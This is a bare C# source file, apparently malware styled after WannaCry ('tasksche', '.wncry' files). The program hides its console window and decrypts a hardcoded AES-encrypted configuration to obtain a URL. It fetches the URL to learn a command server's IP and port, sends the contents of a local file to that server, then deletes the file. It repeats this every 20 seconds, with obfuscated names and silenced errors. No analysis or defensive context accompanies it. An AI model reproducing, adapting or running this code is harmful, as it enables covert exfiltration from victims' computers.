using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace tasksche
{
    class ServerDATA
    {
        public string IP { get; set; }
        public int PORT { get; set; }
    }

    class FileDATA
    {
        public string NAME { get; set; }
        public string KEY { get; set; }
    }

    class UrlDATA
    {
        public string URL { get; set; }
        public string KEY1 { get; set; }
        public string KEY2 { get; set; }
    }

    class Program
    {
        [DllImport("kernel32.dll")]
        private static extern IntPtr GetConsoleWindow();
        [DllImport("user32.dll")]
        private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        private const int SW_HIDE = 0;

        private static string f1(string str, string key, byte[] iv)
        {
            RijndaelManaged aes = new RijndaelManaged();
            aes.KeySize = 256;
            aes.BlockSize = 128;
            aes.Mode = CipherMode.CBC;
            aes.Padding = PaddingMode.PKCS7;
            aes.Key = Encoding.UTF8.GetBytes(key);
            aes.IV = iv;
            var decrypt = aes.CreateDecryptor();
            byte[] xBuff = null;
            using (var ms = new MemoryStream())
            {
                using (var cs = new CryptoStream(ms, decrypt, CryptoStreamMode.Write))
                {
                    byte[] xXml = Convert.FromBase64String(str);
                    cs.Write(xXml, 0, xXml.Length);
                }

                xBuff = ms.ToArray();
            }
            return Encoding.UTF8.GetString(xBuff);
        }

        static void Main(string[] args)
        {
            var handle = GetConsoleWindow();
            ShowWindow(handle, SW_HIDE);
            try
            {
                while (true)
                {
                    try
                    {
                        FileDATA v1 = new FileDATA();
                        v1.NAME = "b.wncry";
                        v1.KEY = "GLD34QaGHRdsR2ws";
                        UrlDATA v2 = new UrlDATA();
                        ServerDATA v3 = new ServerDATA();
                        FileDATA v4 = new FileDATA();
                        v4.NAME = "t.wncry";
                        v4.KEY = "";
                        string v5 = f1(File.ReadAllText(v1.NAME), v1.KEY, new byte[] { 1, 0, 7, 3, 4, 2, 0, 3, 9, 6, 0, 6, 2, 5, 6, 8 });
                        v2.URL = v5.Split('+')[0]; v2.KEY1 = v5.Split('+')[1]; v2.KEY2 = v5.Split('+')[2];
                        string v6 = v2.URL;
                        WebRequest v7 = null;
                        WebResponse v8 = null;
                        Stream v9 = null;
                        StreamReader v10 = null;
                        try
                        {
                            v7 = WebRequest.Create(v2.URL.Trim());
                            v8 = v7.GetResponse();
                            v9 = v8.GetResponseStream();
                            v10 = new StreamReader(v9);
                            string v11 = v10.ReadToEnd();
                            v6 = v11;
                        }
                        catch (Exception) { v3.IP = null; v3.PORT = 0; }
                        finally { if (v10 != null) v10.Close(); if (v10 != null) v10.Close(); }
                        string v12 = f1(v6.Split(new string[] { "&" }, StringSplitOptions.None)[0], v2.KEY1, new byte[] { 1, 0, 7, 3, 4, 2, 0, 3, 9, 6, 0, 6, 2, 5, 6, 8 });
                        string v14 = f1(v6.Split(new string[] { "&" }, StringSplitOptions.None)[1], v2.KEY2, new byte[] { 1, 0, 7, 3, 4, 2, 0, 3, 9, 6, 0, 6, 2, 5, 6, 8 });
                        v3.IP = v12; v3.PORT = int.Parse(v14);
                        string v15 = File.ReadAllText(v4.NAME);
                        NetworkStream v16 = null;
                        StreamReader v17 = null;
                        StreamWriter v18 = null;
                        TcpClient v19 = null;
                        v19 = new TcpClient(v3.IP, v3.PORT);
                        v16 = v19.GetStream();
                        v17 = new StreamReader(v16, Encoding.UTF8);
                        v18 = new StreamWriter(v16, Encoding.UTF8);
                        string v20 = string.Empty;
                        string v21 = string.Empty;
                        v20 = "[SCH]" + v15;
                        v18.WriteLine(v20);
                        v18.Flush();
                        v21 = v17.ReadLine();
                        if (v18 != null) v18.Close();
                        if (v17 != null) v17.Close();
                        if (v19 != null) v19.Close();
                        File.Delete(v4.NAME);
                    }
                    catch (Exception) { }
                    Thread.Sleep(20000);
                }
            }
            catch (Exception) { }
        }
    }
}
